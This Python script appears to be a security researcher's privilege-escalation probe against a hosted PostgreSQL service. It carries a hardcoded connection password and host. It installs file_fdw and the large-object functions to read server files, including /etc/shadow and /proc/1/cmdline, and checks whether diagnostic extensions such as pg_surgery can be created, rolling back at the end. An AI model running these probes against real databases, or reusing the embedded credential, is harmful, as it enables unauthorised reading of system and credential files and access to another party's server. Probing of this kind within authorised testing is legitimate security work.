# -*- coding: utf-8 -*-
"""fdw/诊断扩展免提权探测(单事务,全部 ROLLBACK 零残留)
file_fdw:非 superuser 能否读服务器文件(独立于 #3992341 的根因)
pg_walinspect/pageinspect/pg_surgery/lo:顺带权限探测
零破坏:无 COMMIT"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/postgres' % (PWD, HOST)
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = False
cur = conn.cursor()

def step(tag, sql=None, fetch=True):
    if sql is None:
        sql = tag
    try:
        cur.execute(sql)
        if fetch:
            try:
                return 'OK: %s' % str(cur.fetchall())[:300]
            except Exception:
                return 'OK(no rows)'
        return 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:220]

print('=== 事务内探测(结束后 ROLLBACK) ===')

# 1. file_fdw 本地文件读(核心)
print('\n[1] file_fdw 安装:')
print(step('CREATE EXTENSION file_fdw', 'CREATE EXTENSION file_fdw', fetch=False))
print('CREATE SERVER:', step("CREATE SERVER k_fsrv FOREIGN DATA WRAPPER file_fdw"))
print('CREATE FT /etc/hostname:', step("""CREATE FOREIGN TABLE k_fh (c text)
    SERVER k_fsrv OPTIONS (filename '/etc/hostname', format 'text')""", fetch=False))
print('SELECT /etc/hostname:', step('SELECT * FROM k_fh'))
print('CREATE FT $PGDATA/postgresql.conf:', step("""CREATE FOREIGN TABLE k_fc (c text)
    SERVER k_fsrv OPTIONS (filename (SELECT current_setting('data_directory')) || '/postgresql.conf', format 'text')""", fetch=False))
print('SELECT conf:', step('SELECT * FROM k_fc'))
print('CREATE FT /etc/shadow:', step("""CREATE FOREIGN TABLE k_fsh (c text)
    SERVER k_fsrv OPTIONS (filename '/etc/shadow', format 'text')""", fetch=False))
print('SELECT shadow:', step('SELECT * FROM k_fsh'))
print('CREATE FT /proc/1/cmdline:', step("""CREATE FOREIGN TABLE k_fp (c text)
    SERVER k_fsrv OPTIONS (filename '/proc/1/cmdline', format 'text')""", fetch=False))
print('SELECT cmdline:', step('SELECT * FROM k_fp'))

# 2. pg_walinspect
print('\n[2] pg_walinspect:')
print(step('CREATE EXTENSION pg_walinspect', 'CREATE EXTENSION pg_walinspect', fetch=False))
print('pg_get_wal_record_info:', step("SELECT count(*) FROM pg_get_wal_record_info(pg_current_wal_lsn())"))

# 3. pageinspect(get_raw_page 需 superuser/owner)
print('\n[3] pageinspect:')
print(step('CREATE EXTENSION pageinspect', 'CREATE EXTENSION pageinspect', fetch=False))
print('get_raw_page(platform rel):', step("SELECT length(get_raw_page('health_check', 0))"))

# 4. pg_surgery
print('\n[4] pg_surgery:')
print(step('CREATE EXTENSION pg_surgery', 'CREATE EXTENSION pg_surgery', fetch=False))
print('heap_force_kill func exists:', step("""SELECT proname FROM pg_proc WHERE proname LIKE 'heap_force%'"""))

# 5. lo 扩展(lo_import/lo_export 服务器文件读写,非 superuser)
print('\n[5] lo 扩展:')
print(step('CREATE EXTENSION lo', 'CREATE EXTENSION lo', fetch=False))
print('lo_import /etc/hostname:', step("SELECT lo_import('/etc/hostname')"))

# 6. 诊断扩展函数 ACL 全览(刚刚建的扩展里高权函数)
print('\n[6] 新扩展函数 ACL(EXECUTE 授予谁):')
print(step("""SELECT n.nspname, p.proname, pg_get_userbyid(p.proowner),
              array_agg(DISTINCT coalesce(a.grantee::text,'PUBLIC'))
       FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace
       LEFT JOIN information_schema.routine_privileges rp
         ON rp.specific_name = p.oid::text
       LEFT JOIN pg_roles a ON a.rolname = rp.grantee
       WHERE n.nspname IN ('public','pg_catalog') AND p.proowner <> 10
         AND p.pronamespace IN (SELECT oid FROM pg_namespace WHERE nspname IN ('public'))
       GROUP BY 1,2,3 ORDER BY 1,2 LIMIT 30"""))

print('\n=== ROLLBACK ===')
conn.rollback()
print('rolled back')
print('残留检查:', end=' ')
cur.execute("SELECT extname FROM pg_extension WHERE extname IN ('file_fdw','pg_walinspect','pageinspect','pg_surgery','lo')")
print('exts left:', cur.fetchall())
conn.close()
